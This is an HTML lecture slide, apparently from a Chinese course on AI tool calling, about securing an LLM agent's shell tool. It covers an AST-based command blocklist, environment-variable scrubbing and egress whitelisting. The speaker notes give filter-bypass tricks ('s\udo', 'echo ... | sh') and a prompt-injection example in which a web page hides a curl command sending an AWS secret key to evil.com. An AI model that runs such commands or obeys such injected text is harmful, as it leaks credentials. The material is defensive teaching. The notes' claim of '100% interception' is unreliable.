@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="zh-CN" class="h-full light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Slide 24 - Bash / Shell 终端工具的安全防护：命令黑名单、sudo 禁绝与环境变量隔离</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            50: '#eff6ff',
+                            100: '#dbeafe',
+                            500: '#3b82f6',
+                            600: '#2563eb',
+                            700: '#1d4ed8',
+                            900: '#1e3a8a',
+                        },
+                        accent: {
+                            cyan: '#0891b2',
+                            emerald: '#059669',
+                            purple: '#7c3aed',
+                            amber: '#d97706',
+                            rose: '#e11d48',
+                            indigo: '#4f46e5'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'system-ui', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'Fira Code', 'monospace']
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
+        
+        .bg-grid-pattern {
+            background-size: 30px 30px;
+            background-image: 
+                linear-gradient(to right, rgba(0, 0, 0, 0.03) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(0, 0, 0, 0.03) 1px, transparent 1px);
+        }
+        .soft-shadow {
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.04), 0 8px 10px -6px rgba(0, 0, 0, 0.02);
+        }
+    </style>
+</head>
+<body class="h-full bg-slate-50 text-slate-800 font-sans flex flex-col overflow-hidden select-none">
+
+    <!-- Header Bar -->
+    <header class="h-16 border-b border-slate-200 bg-white/90 backdrop-blur-md px-6 flex items-center justify-between z-20 shrink-0">
+        <div class="flex items-center space-x-3">
+            <div class="w-3 h-3 rounded-full bg-blue-600"></div>
+            <h1 class="text-sm md:text-base font-semibold text-slate-800 tracking-tight">
+                AI 应用与辅助编程架构师视角 (Course 4: Skill & Function Calling)
+            </h1>
+        </div>
+
+        <div class="flex items-center space-x-2">
+            <button id="toggleNotesBtn" onclick="toggleSpeakerNotes()" class="px-3 py-1.5 rounded-lg border border-slate-200 bg-slate-50 hover:bg-slate-100 text-xs font-medium text-slate-700 transition flex items-center gap-2">
+                <i class="fa-solid fa-note-sticky text-amber-500"></i>
+                <span>演讲备注</span>
+            </button>
+            <button id="fullscreenBtn" onclick="toggleFullscreen()" class="p-2 rounded-lg border border-slate-200 bg-slate-50 hover:bg-slate-100 text-slate-600 hover:text-slate-900 transition">
+                <i class="fa-solid fa-expand text-xs"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- Main Content Area -->
+    <main class="flex-1 relative flex flex-col justify-between p-6 md:p-10 lg:p-12 bg-white bg-grid-pattern overflow-y-auto">
+        
+        <div class="absolute top-10 left-1/4 w-96 h-96 bg-rose-100/40 rounded-full blur-3xl pointer-events-none"></div>
+        <div class="absolute bottom-10 right-1/4 w-96 h-96 bg-amber-100/40 rounded-full blur-3xl pointer-events-none"></div>
+
+        <!-- Title Block -->
+        <div class="relative z-10 max-w-6xl mx-auto w-full">
+            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-rose-50 border border-rose-200 text-rose-700 font-mono text-xs font-semibold tracking-wider uppercase mb-3">
+                <i class="fa-solid fa-terminal"></i>
+                <span>第 4 课：AI 原子能力与工具调用 · 模块三</span>
+            </div>
+            
+            <h1 class="text-2xl md:text-3xl lg:text-4xl font-extrabold text-slate-900 tracking-tight leading-tight mb-3">
+                Bash / Shell 终端工具的安全防护：命令黑名单、sudo 禁绝与环境变量隔离
+            </h1>
+            
+            <p class="text-sm sm:text-base md:text-lg lg:text-xl font-medium text-slate-600 w-full max-w-full leading-relaxed">
+                收紧终端 Shell 的物理破坏威力：通过 <span class="text-rose-600 font-semibold underline decoration-rose-300 decoration-2 underline-offset-4">AST 词法解析防护</span>、<span class="text-amber-600 font-semibold underline decoration-amber-300 decoration-2 underline-offset-4">sudo 提权禁绝</span> 与 <span class="text-blue-600 font-semibold underline decoration-blue-300 decoration-2 underline-offset-4">环境变量脱敏隔离</span>，封堵提权、外退凭证与破坏性指令
+            </p>
+        </div>
+
+        <!-- Content Grid (2 Columns: AST Interceptor Code vs Security Pillars) -->
+        <div class="relative z-10 max-w-6xl mx-auto w-full my-6 grid grid-cols-1 sm:grid-cols-2 gap-4 md:gap-6">
+            
+            <!-- Left Card: Shell AST Interceptor Code -->
+            <div class="group relative rounded-2xl border border-rose-200 bg-rose-50/30 p-5 md:p-6 soft-shadow transition hover:border-rose-300 flex flex-col justify-between">
+                <div>
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 rounded-xl bg-rose-100 border border-rose-200 flex items-center justify-center text-rose-600 text-lg shrink-0">
+                                <i class="fa-solid fa-shield-virus"></i>
+                            </div>
+                            <div>
+                                <h3 class="text-base font-bold text-slate-900">Shell 终端 AST 安全拦截引擎</h3>
+                                <p class="text-xs text-rose-700 font-mono">AST Command Security Interceptor</p>
+                            </div>
+                        </div>
+                        <span class="px-2.5 py-0.5 rounded-full bg-rose-100 border border-rose-200 text-rose-800 text-[11px] font-mono font-bold">Shell Interceptor</span>
+                    </div>
+
+                    <!-- Python Code Box -->
+                    <pre class="bg-slate-900 text-slate-100 rounded-xl p-3.5 font-mono text-[10px] md:text-[11px] mb-3 shadow-inner overflow-x-auto leading-relaxed"><code><span class="text-purple-400">import</span> bashlex
+
+<span class="text-purple-300">def</span> <span class="text-blue-300">verify_shell_command</span>(cmd: <span class="text-emerald-300">str</span>) -&gt; <span class="text-emerald-300">bool</span>:
+    <span class="text-slate-500"># 1. 利用 bashlex 进行 AST 词法拆解，防分号/管道混淆绕过 ★</span>
+    trees = bashlex.parse(cmd)
+    
+    <span class="text-slate-500"># 2. 禁用高危指令与提权句柄 (Blacklist Tokens)</span>
+    forbidden = {<span class="text-amber-200">"sudo"</span>, <span class="text-amber-200">"su"</span>, <span class="text-amber-200">"chmod"</span>, <span class="text-amber-200">"chown"</span>, <span class="text-amber-200">"mkfs"</span>}
+    <span class="text-purple-300">for</span> node <span class="text-purple-300">in</span> bashlex.split(cmd):
+        <span class="text-purple-300">if</span> node.lower() <span class="text-purple-300">in</span> forbidden:
+            <span class="text-purple-300">raise</span> SecurityError(<span class="text-amber-200">f"Forbidden command '{node}' detected!"</span>)
+            
+    <span class="text-slate-500"># 3. 环境变量脱敏隔离：剔除敏感 AK/SK ★</span>
+    clean_env = {
+        k: v <span class="text-purple-300">for</span> k, v <span class="text-purple-300">in</span> os.environ.items()
+        <span class="text-purple-300">if</span> <span class="text-purple-300">not</span> k.startswith((<span class="text-amber-200">"AWS_"</span>, <span class="text-amber-200">"DB_"</span>, <span class="text-amber-200">"SECRET_"</span>))
+    }
+    <span class="text-purple-300">return</span> run_in_sandbox(cmd, env=clean_env)</code></pre>
+
+                    <ul class="space-y-1.5 text-xs text-slate-700">
+                        <li class="flex items-start gap-2">
+                            <i class="fa-solid fa-check text-emerald-600 mt-0.5 shrink-0"></i>
+                            <span><strong>防形变与管道绕过：</strong>不依赖脆弱的纯文本正则匹配，使用 AST 语法树彻底消杀 `; sudo` 或重定向混淆。</span>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="mt-4 pt-3 border-t border-rose-200/60 text-xs text-rose-900 font-mono flex items-center gap-2">
+                    <i class="fa-solid fa-triangle-exclamation text-rose-600"></i>
+                    <span>物理铁律：绝不允许 LLM 终端工具拥有 root 提权或直接读取包含私有密钥的宿主环境变量</span>
+                </div>
+            </div>
+
+            <!-- Right Card: Three Pillars of Shell Terminal Security -->
+            <div class="group relative rounded-2xl border border-amber-200 bg-amber-50/30 p-5 md:p-6 soft-shadow transition hover:border-amber-300 flex flex-col justify-between">
+                <div>
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 rounded-xl bg-amber-100 border border-amber-200 flex items-center justify-center text-amber-600 text-lg shrink-0">
+                                <i class="fa-solid fa-shield-halved"></i>
+                            </div>
+                            <div>
+                                <h3 class="text-base font-bold text-slate-900">Shell 终端防护的三大工程壁垒</h3>
+                                <p class="text-xs text-amber-700 font-mono">Shell Security Pillars</p>
+                            </div>
+                        </div>
+                        <span class="px-2.5 py-0.5 rounded-full bg-amber-100 border border-amber-200 text-amber-800 text-[11px] font-mono font-bold">Hardening Pillars</span>
+                    </div>
+
+                    <div class="space-y-3.5 text-xs text-slate-700">
+                        <!-- Pillar 1 -->
+                        <div class="p-3 rounded-xl bg-white border border-amber-100 soft-shadow space-y-1">
+                            <div class="font-bold text-slate-900 flex items-center gap-2">
+                                <span class="px-1.5 py-0.5 rounded bg-rose-100 text-rose-800 font-mono font-bold text-[10px]">1. AST 语法树词法审计 (AST Auditing)</span>
+                                <span>No Bypass String Tricks</span>
+                            </div>
+                            <p class="text-slate-600 leading-relaxed text-[11px]">
+                                通过 `bashlex` 解析指令结构，拦截重定向注入、Base64 解码执行（`base64 -d | sh`）与连字符提权绕过。
+                            </p>
+                        </div>
+
+                        <!-- Pillar 2 -->
+                        <div class="p-3 rounded-xl bg-white border border-amber-100 soft-shadow space-y-1">
+                            <div class="font-bold text-slate-900 flex items-center gap-2">
+                                <span class="px-1.5 py-0.5 rounded bg-amber-100 text-amber-800 font-mono font-bold text-[10px]">2. 环境变量隔离与脱敏 (Env Sanitization)</span>
+                                <span>No Secret Leakage</span>
+                            </div>
+                            <p class="text-slate-600 leading-relaxed text-[11px]">
+                                终端沙箱启动时彻底清洗 `AWS_SECRET_ACCESS_KEY`、`DATABASE_URL` 等环境变量，防止提示注入通过 `env` 命令窃取密钥。
+                            </p>
+                        </div>
+
+                        <!-- Pillar 3 -->
+                        <div class="p-3 rounded-xl bg-white border border-amber-100 soft-shadow space-y-1">
+                            <div class="font-bold text-slate-900 flex items-center gap-2">
+                                <span class="px-1.5 py-0.5 rounded bg-emerald-100 text-emerald-800 font-mono font-bold text-[10px]">3. 严格指令白名单与出站熔断 (Command Whitelist)</span>
+                                <span>Egress & Command Gates</span>
+                            </div>
+                            <p class="text-slate-600 leading-relaxed text-[11px]">
+                                默认禁止外网 curl/wget 出站外退数据；白名单仅允许 `git`, `pytest`, `ls`, `grep`, `cat` 等安全开发指令。
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-4 pt-3 border-t border-amber-200/60 text-xs text-amber-900 font-mono flex items-center gap-2">
+                    <i class="fa-solid fa-circle-check text-emerald-600"></i>
+                    <span>最佳实践：严格限制可执行命令字典，配以物理网络出站断路器</span>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Architectural Takeaway Banner -->
+        <div class="relative z-10 max-w-6xl mx-auto w-full rounded-xl border border-slate-200 bg-slate-50 p-4 md:p-5 flex items-center justify-between gap-4">
+            <div class="flex items-center gap-3">
+                <div class="p-2 rounded-lg bg-rose-100 text-rose-700 text-lg shrink-0">
+                    <i class="fa-solid fa-compass-drafting"></i>
+                </div>
+                <div>
+                    <h4 class="text-xs font-mono uppercase text-slate-500 font-semibold">Architectural Core Thesis / 架构师视角</h4>
+                    <p class="text-sm font-medium text-slate-800">
+                        终端 Shell 是大模型改变物理世界的最强“双刃剑”；通过 <strong>AST 语法树防绕过、环境变量脱敏与出站网络白名单</strong>，在沙箱外层建立硬件级防火墙，是允许 Agent 触碰终端命令的硬前提。
+                    </p>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Footer Controls -->
+    <footer class="h-16 border-t border-slate-200 bg-white px-6 flex items-center justify-between z-20 shrink-0">
+        <div class="flex items-center space-x-4">
+            <div class="text-xs font-mono text-slate-500">
+                <span id="currentSlideNum" class="text-slate-900 font-bold">24</span> / <span id="totalSlidesNum">40</span> Slides
+            </div>
+            <div class="w-32 md:w-48 bg-slate-100 h-1.5 rounded-full overflow-hidden border border-slate-200">
+                <div class="bg-blue-600 h-full w-[60%] transition-all duration-300"></div>
+            </div>
+        </div>
+
+        <!-- Slide Controls (23.html <- 24.html -> 25.html) -->
+        <div class="flex items-center space-x-3">
+            <a href="23.html" title="上一页" class="p-2 rounded-lg border border-slate-200 bg-slate-50 text-slate-700 hover:bg-blue-50 hover:text-blue-600 hover:border-blue-200 transition flex items-center justify-center">
+                <i class="fa-solid fa-chevron-left text-xs"></i>
+            </a>
+            <span class="text-xs font-mono text-slate-600 hidden md:inline">Bash/Shell 终端安全防护</span>
+            <a href="25.html" title="下一页" class="p-2 rounded-lg border border-slate-200 bg-slate-50 text-slate-700 hover:bg-blue-50 hover:text-blue-600 hover:border-blue-200 transition flex items-center justify-center">
+                <i class="fa-solid fa-chevron-right text-xs"></i>
+            </a>
+        </div>
+
+        <div class="hidden lg:flex items-center gap-3 text-xs text-slate-500 font-mono">
+            <span class="flex items-center gap-1">
+                <a href="23.html" title="上一页" class="px-2 py-0.5 rounded bg-slate-100 border border-slate-200 text-slate-700 hover:bg-blue-600 hover:text-white transition flex items-center justify-center">
+                    <i class="fa-solid fa-arrow-left text-[11px]"></i>
+                </a>
+                <a href="25.html" title="下一页" class="px-2 py-0.5 rounded bg-slate-100 border border-slate-200 text-slate-700 hover:bg-blue-600 hover:text-white transition flex items-center justify-center">
+                    <i class="fa-solid fa-arrow-right text-[11px]"></i>
+                </a>
+                <span class="ml-1 text-slate-500">翻页</span>
+            </span>
+            <span><kbd onclick="toggleFullscreen()" class="px-1.5 py-0.5 rounded bg-slate-100 border border-slate-200 text-slate-700 cursor-pointer hover:bg-slate-200">F</kbd> 全屏</span>
+        </div>
+    </footer>
+
+    <!-- Speaker Notes Drawer -->
+    <div id="speakerNotesDrawer" class="hidden fixed inset-y-0 right-0 w-full md:w-96 bg-white border-l border-slate-200 z-50 p-6 flex flex-col justify-between shadow-2xl transition-transform duration-300">
+        <div>
+            <div class="flex items-center justify-between pb-4 mb-4 border-b border-slate-200">
+                <div class="flex items-center gap-2 text-amber-700 font-semibold text-sm">
+                    <i class="fa-solid fa-sticky-note"></i>
+                    <span>Speaker Notes / 讲师讲稿</span>
+                </div>
+                <button onclick="toggleSpeakerNotes()" class="text-slate-400 hover:text-slate-700">
+                    <i class="fa-solid fa-xmark text-lg"></i>
+                </button>
+            </div>
+            <div class="space-y-4 text-xs md:text-sm text-slate-700 leading-relaxed overflow-y-auto max-h-[calc(100vh-160px)] pr-2">
+                <div class="p-3 rounded-lg bg-rose-50 border border-rose-200">
+                    <span class="font-bold text-rose-900 block mb-1">🎯 讲授 Shell 命令防绕过的重要性：</span>
+                    “向学员深入剖析：如果直接用 `re.search("sudo")` 来过滤终端命令，黑客可以通过 `s\udo`、`su''do` 或者通过重定向与管道拼接（如 `echo "..." | sh`）轻易绕过正则校验。必须使用 `bashlex` 解析 AST 语法树才能做到 100% 拦截。”
+                </div>
+                <div class="p-3 rounded-lg bg-amber-50 border border-amber-200">
+                    <span class="font-bold text-amber-900 block mb-1">💡 强调环境变量脱敏与外网切断：</span>
+                    “提示学员：在拉起 Bash 终端沙箱时，绝不要把宿主机包含 AWS Key 或数据库连接串的环境变量暴露给子进程。一旦大模型遭受间接提示注入（Prompt Injection），黑客可以在网页里藏一条 `curl http://evil.com?env=$AWS_SECRET_ACCESS_KEY`，几秒内完成凭证窃取。”
+                </div>
+            </div>
+        </div>
+        <div class="text-xs font-mono text-slate-400 pt-4 border-t border-slate-200">
+            Press ESC or click X to close
+        </div>
+    </div>
+
+    <!-- JavaScript Controls -->
+    <script>
+        function toggleSpeakerNotes() {
+            document.getElementById('speakerNotesDrawer').classList.toggle('hidden');
+        }
+
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(err => console.error(err));
+            } else {
+                if (document.exitFullscreen) document.exitFullscreen();
+            }
+        }
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'ArrowLeft') {
+                window.location.href = '23.html';
+            } else if (e.key === 'ArrowRight') {
+                window.location.href = '25.html';
+            } else if (e.key === 'f' || e.key === 'F') {
+                toggleFullscreen();
+            } else if (e.key === 'n' || e.key === 'N') {
+                toggleSpeakerNotes();
+            } else if (e.key === 'Escape') {
+                document.getElementById('speakerNotesDrawer').classList.add('hidden');
+            }
+        });
+    </script>
+</body>
+</html>
